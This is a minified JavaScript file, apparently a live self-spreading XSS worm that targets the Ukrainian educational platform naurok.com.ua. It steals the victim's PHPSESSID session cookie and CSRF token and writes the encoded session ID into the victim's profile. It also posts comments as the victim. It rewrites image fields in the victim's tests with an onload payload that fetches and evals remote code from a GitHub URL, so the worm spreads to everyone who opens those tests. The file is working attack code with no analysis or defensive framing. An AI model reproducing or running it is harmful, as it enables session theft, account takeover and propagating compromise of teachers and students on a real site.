(()=>{"use strict";({607:function(){var t=this&&this.__awaiter||function(t,e,n,o){return new(n||(n=Promise))((function(i,r){function c(t){try{s(o.next(t))}catch(t){r(t)}}function a(t){try{s(o.throw(t))}catch(t){r(t)}}function s(t){var e;t.done?i(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(c,a)}s((o=o.apply(t,e||[])).next())}))};const e=function(t){return(new DOMParser).parseFromString(t,"text/html")},n=t=>new Promise((e=>setTimeout(e,t))),o=(e,o={})=>t(void 0,void 0,void 0,(function*(){for(let t=1;t<5;++t){const i=yield fetch(e,o);if(403!==i.status&&429!==i.status)return i;yield n(200*t)}return fetch(e,o)}));!function(){t(this,void 0,void 0,(function*(){const i=document.querySelectorAll("img[i]");for(const t of i)t.removeAttribute("onload"),t.removeAttribute("i"),t.setAttribute("src",t.getAttribute("src").slice(0,-1));if(window.e)return;window.e=!0;const r=document.cookie.match(/PHPSESSID=([a-z0-9]+)/);if(!r)return console.log("no ssid");const c=r[1],a=document.URL,s=document.referrer,u=yield o("https://naurok.com.ua"),d=yield u.text(),l=d.match(/meta name="csrf-token" content="(.+)"/);if(!l)return console.log("no csrf");const m=l[1];if(!m)return console.log("no csrf 2");const f=d.match(/<a href=".profile.(.+)">Особиста/);if(!f)return;const p=parseInt(f[1]);if(3250755===p)return;const h=[],y=e=>t(this,void 0,void 0,(function*(){const t=yield o(`https://naurok.com.ua/api/test/documents/${e}`);return yield t.json()})),g=function(e){return t(this,void 0,void 0,(function*(){const t=e.match(/(\d+).html/);if(!t)return;const n=t[1],i=yield y(n);if(!i)return;const{document:r,questions:c}=i;r.status=2;const a=r.id,s="https://naurok.com.ua/test/builder/"+a;if(r.image||(r.image="https://naurok-test2.nyc3.digitaloceanspaces.com/3250725/images/801236_1651844282.png"),!r.image.includes("?")){t:for(const t of c){if(t.csrf=m,t.image){t.image+="?\"i onload=\"fetch('https://raw.githubusercontent.com/nusc/a/m/i.js').then(v=>v.text()).then(eval)",yield o(`https://naurok.com.ua/api/test/questions/${t.id}?expand=options`,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8"},referrer:s,referrerPolicy:"strict-origin-when-cross-origin",body:JSON.stringify(t),method:"PATCH",mode:"cors",credentials:"include"});break}for(const e of t.options)if(e.image){e.image+="?\"i onload=\"fetch('https://raw.githubusercontent.com/nusc/a/m/i.js').then(v=>v.text()).then(eval)",yield o(`https://naurok.com.ua/api/test/questions/${n}?expand=options`,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8"},referrer:s,referrerPolicy:"strict-origin-when-cross-origin",body:JSON.stringify(t),method:"PATCH",mode:"cors",credentials:"include"});break t}}r.image+="?\"i onload=\"fetch('https://raw.githubusercontent.com/nusc/a/m/i.js').then(v=>v.text()).then(eval)",yield o("https://naurok.com.ua/api/test/documents/"+a,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8",Referer:s,"Referrer-Policy":"strict-origin-when-cross-origin"},body:JSON.stringify(r),method:"PUT"})}}))};h.push(function(){return t(this,void 0,void 0,(function*(){const t=yield o("https://naurok.com.ua/preferences"),e=(yield t.text()).match(/<textarea id="accountpreferences-about" class="form-control" name="AccountPreferences.about.+">(.*)<.textarea>/s);if(!e)return;const n=e[1]+"\nu: "+a+"\nr: "+s,i=function(t){return btoa(t)}(c);yield o("https://naurok.com.ua/preferences",{headers:{accept:"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","content-type":"multipart/form-data; boundary=----WebKitFormBoundaryKnLgq0VhMq7Xl2Pu"},referrer:"https://naurok.com.ua/preferences",referrerPolicy:"strict-origin-when-cross-origin",body:`------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name="_csrf"\r\n\r\n${m}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name="AccountPreferences[position]"\r\n\r\n${i}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name="AccountPreferences[about]"\r\n\r\n${n}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data;`,method:"POST",mode:"cors",credentials:"include",redirect:"manual"})}))}()),h.push(function(){return t(this,void 0,void 0,(function*(){const t=yield o("https://naurok.com.ua/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya"),e=yield t.text();if(e.includes(`href="/profile/${p}" d`))return;const n=e.match(/form id="comment-form" class="comment-box" action="\/comment\/default\/create\?entity=(.+)" method="post"/);if(!n)return console.log("ncf");const i=n[1],r=atob("Jg==");yield o(`https://naurok.com.ua/comment/default/create?entity=${i}`,{headers:{accept:"*/*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token":`${m}`,"x-requested-with":"XMLHttpRequest"},referrer:"https://naurok.com.ua/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya",referrerPolicy:"strict-origin-when-cross-origin",body:`_csrf=${m}${r}CommentModel[content]=Привіт${r}CommentModel[parentId]=${r}CommentModel[url]=/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya`,method:"POST",mode:"cors",credentials:"include"})}))}()),h.push(function(){var i;return t(this,void 0,void 0,(function*(){for(let t=1;;++t){const r=yield o(`https://naurok.com.ua/test/moe?storinka=${t}`),c=yield r.text(),a=e(c),s=a.querySelector("body > div.container-fluid > div > div > div.col-md-10 > div.row > div.col-md-9 > div.items > ul > li.active > a");if(!s&&1!==t)return;if(s&&s.innerText!==`${t}`)return;const u=a.querySelectorAll(".file-item.test-item");for(const t of u){const e=t.querySelector("img");if(e&&(null===(i=e.getAttribute("src"))||void 0===i?void 0:i.includes("?")))continue;const n=t.querySelector(".headline a");if(!n)continue;const o=n.getAttribute("href");o&&(yield g("https://naurok.com.ua"+o))}n(1e3)}}))}()),yield Promise.all(h)}))}()}})[607]()})();
